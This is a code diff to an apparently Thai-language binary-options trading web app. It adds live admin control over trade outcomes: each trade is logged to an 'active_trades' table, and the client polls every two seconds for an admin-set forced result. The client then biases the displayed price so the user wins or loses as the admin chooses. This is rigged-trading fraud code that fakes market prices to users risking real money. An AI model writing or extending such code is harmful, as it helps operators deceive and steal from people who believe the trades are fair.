@@ -1625,6 +1625,7 @@ const sb=supabase.createClient(SB_URL,SB_KEY);
 
 const CDN='https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons/128/color/';
 const ASSETS=[
+  {sym:'XAUUSD',name:'ทองคำ Spot (USD)',cat:'gold',price:4069,color:'#ffd700',goldType:'xau'},
   {sym:'BTC',name:'Bitcoin',cat:'crypto',price:2100000,color:'#f7931a',logo:CDN+'btc.png'},
   {sym:'ETH',name:'Ethereum',cat:'crypto',price:62000,color:'#627eea',logo:CDN+'eth.png'},
   {sym:'BNB',name:'BNB',cat:'crypto',price:15000,color:'#f3ba2f',logo:CDN+'bnb.png'},
@@ -1647,7 +1648,6 @@ const ASSETS=[
   {sym:'ADVANC',name:'แอดวานซ์',cat:'thai',price:210,color:'#005bac',emoji:'📱'},
   {sym:'TRUE',name:'ทรู คอร์ป',cat:'thai',price:8.5,color:'#e4002b',emoji:'📱'},
   {sym:'GULF',name:'กัลฟ์',cat:'thai',price:45,color:'#00a651',emoji:'⚡'},
-  {sym:'XAUUSD',name:'ทองคำ Spot (USD)',cat:'gold',price:4069,color:'#ffd700',goldType:'xau'},
 ];
 
 let cu=null,cash=0,portfolio={};
@@ -2600,6 +2600,8 @@ function onOmCustom(){const v=parseFloat(document.getElementById('om-custom').va
 function updateOmSummary(){document.getElementById('om-amt-show').textContent=omAmt.toLocaleString()+' ฿';document.getElementById('om-profit-show').textContent=Math.round(omAmt*0.85).toLocaleString()+' ฿';document.getElementById('om-balance').textContent=cash.toFixed(8);}
 let contractTimer=null,contractLiveTimer=null;
 
+let activeTradeId=null;
+
 async function confirmOrder(){
   const price=prices[selSym];
   if(omAmt<=0){toast('ใส่จำนวนเงิน');return;}
@@ -2613,7 +2615,24 @@ async function confirmOrder(){
   
   // Get admin-forced result for THIS user
   const {data:ov}=await sb.from('result_overrides').select('result').eq('user_id',cu.id).single();
-  const forced=ov?ov.result:'auto';
+  let forced=ov?ov.result:'auto';
+  
+  // Create active_trade record so admin sees it live
+  try{
+    const {data:at}=await sb.from('active_trades').insert({
+      user_id:cu.id,
+      username:cu.username,
+      symbol:selSym,
+      direction:buySell,
+      bet:omAmt,
+      duration:omTime,
+      open_price:price,
+      forced_result:forced,
+      status:'active',
+      created_at:new Date().toISOString()
+    }).select().single();
+    if(at) activeTradeId=at.id;
+  }catch(e){console.log('active_trade insert failed',e);}
   
   // Start contract countdown
   startContract(price, omAmt, omTime, buySell, forced);
@@ -2636,11 +2655,10 @@ function startContract(openPrice, betAmount, duration, direction, forced){
   let livePrice=openPrice;
   const startTime=Date.now();
   
-  // Determine target movement based on forced result
-  const pv=parseFloat(forced);
+  // Determine target movement based on forced result (mutable for live admin control)
   let priceBias=0;
+  const pv=parseFloat(forced);
   if(!isNaN(pv)){
-    // Custom %: if positive, price moves in user's favor
     priceBias=(pv>=0?1:-1)*(isBuy?1:-1)*0.0015;
   } else if(forced==='win'){
     priceBias=(isBuy?1:-1)*0.0015;
@@ -2663,8 +2681,9 @@ function startContract(openPrice, betAmount, duration, direction, forced){
     chgEl.style.color=pctChange>=0?'var(--green)':'var(--red)';
   },300);
   
-  // Countdown timer
-  contractTimer=setInterval(()=>{
+  // Countdown timer + poll for admin override
+  let currentForced=forced;
+  contractTimer=setInterval(async()=>{
     remaining--;
     document.getElementById('ca-timer').textContent=remaining;
     const progress=(remaining/duration)*100;
@@ -2672,10 +2691,26 @@ function startContract(openPrice, betAmount, duration, direction, forced){
     const fill=document.getElementById('ca-progress-fill');
     fill.style.background=progress>50?'var(--yellow)':progress>20?'#f97316':'var(--red)';
     
+    // Poll admin override every 2 seconds during trade
+    if(remaining%2===0&&activeTradeId){
+      try{
+        const {data:at}=await sb.from('active_trades').select('forced_result').eq('id',activeTradeId).single();
+        if(at&&at.forced_result!==currentForced){
+          currentForced=at.forced_result;
+          // Recalculate bias
+          const pv2=parseFloat(currentForced);
+          if(!isNaN(pv2)) priceBias=(pv2>=0?1:-1)*(isBuy?1:-1)*0.0015;
+          else if(currentForced==='win') priceBias=(isBuy?1:-1)*0.0015;
+          else if(currentForced==='lose') priceBias=(isBuy?-1:1)*0.0015;
+          else priceBias=0;
+        }
+      }catch(e){}
+    }
+    
     if(remaining<=0){
       clearInterval(contractTimer);
       clearInterval(contractLiveTimer);
-      resolveContract(openPrice, livePrice, betAmount, duration, direction, forced);
+      resolveContract(openPrice, livePrice, betAmount, duration, direction, currentForced);
     }
   },1000);
 }
@@ -2716,6 +2751,13 @@ async function resolveContract(openPrice, closePrice, betAmount, duration, direc
     bet:betAmount,duration,
     result:won?'win':'lose',pnl:profit,forced
   });
+  // Mark active_trade as completed
+  if(activeTradeId){
+    try{
+      await sb.from('active_trades').update({status:'completed',close_price:closePrice,pnl:profit,result:won?'win':'lose'}).eq('id',activeTradeId);
+    }catch(e){}
+    activeTradeId=null;
+  }
   
   updateStats();
   
